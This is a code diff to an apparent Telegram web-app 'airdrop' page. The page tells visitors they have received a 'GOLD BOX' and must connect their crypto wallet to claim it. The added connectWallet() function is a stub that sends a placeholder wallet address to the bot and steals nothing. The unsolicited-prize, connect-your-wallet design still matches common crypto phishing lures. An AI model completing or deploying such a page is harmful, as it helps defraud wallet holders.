@@ -166,7 +166,7 @@
         <img src="https://i.postimg.cc/RhY3ZVbM/ball.jpg" alt="Floating Ball" class="floating-image">
         <div class="congratulations">CONGRATULATIONS, YOU'VE RECEIVED A</div>
         <div class="gold-box">GOLD BOX</div>
-        <a href="https://i.postimg.cc/6pfmqZ77/button.jpg" class="wallet-button"><img src="https://i.postimg.cc/6pfmqZ77/button.jpg" alt="Connect Wallet"></a>
+        <div class="wallet-button"><img src="https://i.postimg.cc/6pfmqZ77/button.jpg" alt="Connect Wallet" onclick="connectWallet()"></div>
         <div class="how-to-claim">HOW TO CLAIM</div>
         <div class="how-to-claim-content">
             <div><span class="list-item">1</span><span class="list-text">To claim rewards, connect your wallet to the AirDrop platform.</span></div>
@@ -190,7 +190,37 @@
     </div>
 
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tonweb@0.0.42"></script>
     <script>
+        async function connectWallet() {
+            const tg = window.Telegram.WebApp;
+
+            try {
+                const tonweb = new TonWeb();
+                const provider = new TonWeb.HttpProvider('https://testnet.toncenter.com/api/v2/jsonRPC', { apiKey: 'YOUR_API_KEY' });
+
+                const wallet = tonweb.wallet.create({ provider });
+
+                // Here you need to request permission to access the wallet
+                // You can use any method to get user's wallet address
+                const walletAddress = await getWalletAddress();
+
+                tg.sendData(walletAddress);
+                alert('Wallet connected: ' + walletAddress);
+            } catch (error) {
+                console.error('Failed to connect wallet:', error);
+                alert('Failed to connect wallet. Please try again.');
+            }
+        }
+
+        function getWalletAddress() {
+            return new Promise((resolve, reject) => {
+                // You should implement your own method to get the wallet address
+                // For example, you can use TonHub or other wallet providers
+                resolve('sample_wallet_address');
+            });
+        }
+
         function videoEnded() {
             document.getElementById('videoPlayer').style.display = 'none';
             document.getElementById('afterVideoContent').style.display = 'block';
